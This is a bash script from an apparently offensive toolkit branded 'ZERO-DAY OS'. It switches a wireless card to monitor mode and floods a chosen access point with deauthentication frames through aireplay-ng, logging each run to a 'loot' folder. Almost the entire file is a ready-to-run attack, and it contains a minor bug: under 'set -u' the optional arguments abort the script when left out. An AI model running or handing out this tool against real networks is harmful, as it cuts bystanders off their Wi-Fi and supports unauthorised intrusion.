#!/bin/bash
set -euo pipefail
# /usr/local/bin/wifi-deauth
# Monitor mode + deauth attack
# Usage: wifi-deauth <iface> [bssid] [channel]

# ── Input validation ──
validate_mac() { echo "$1" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$' || { echo "[!] Invalid MAC address: $1"; exit 1; }; }
validate_channel() { echo "$1" | grep -qE '^[0-9]+$' && [ "$1" -ge 1 ] && [ "$1" -le 200 ] || { echo "[!] Invalid channel (1-200): $1"; exit 1; }; }

IFACE="${1:-wlan0}"
BSSID="$2"
CHAN="$3"
LOOT="/opt/cardputer/loot/recon"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Validate arguments if provided
[ -n "$BSSID" ] && validate_mac "$BSSID"
[ -n "$CHAN" ] && validate_channel "$CHAN"

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Root required."
    exit 1
fi

mkdir -p "$LOOT"

if [ -z "$BSSID" ]; then
    echo "[*] No target BSSID specified. Launching scan first..."
    echo "[*] Find your target, then run:"
    echo "    sudo wifi-deauth $IFACE <BSSID> <CHANNEL>"
    echo ""
    wifi-scan "$IFACE"
    exit 0
fi

if [ -z "$CHAN" ]; then
    echo "[!] Channel required for targeted deauth."
    echo "    Usage: wifi-deauth $IFACE $BSSID <CHANNEL>"
    exit 1
fi

echo "[*] ZERO-DAY OS — WiFi Deauth Attack"
echo "[*] Target: $BSSID on channel $CHAN"
echo ""

IFTYPE=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
if [ "$IFTYPE" != "monitor" ]; then
    echo "[*] Setting $IFACE to monitor mode..."
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor
    ip link set "$IFACE" up
    sleep 1
fi

iw dev "$IFACE" set channel "$CHAN"
echo "[*] Interface $IFACE in monitor mode on channel $CHAN"
echo "[*] Sending deauth frames to $BSSID..."
echo "[*] Press Ctrl+C to stop"
echo ""

OUTFILE="$LOOT/deauth_${BSSID//:/}_ch${CHAN}_${TIMESTAMP}.log"

aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" 2>&1 | tee "$OUTFILE"

echo ""
echo "[*] Deauth stopped. Log: $OUTFILE"

iw dev "$IFACE" set type managed 2>/dev/null
ip link set "$IFACE" up 2>/dev/null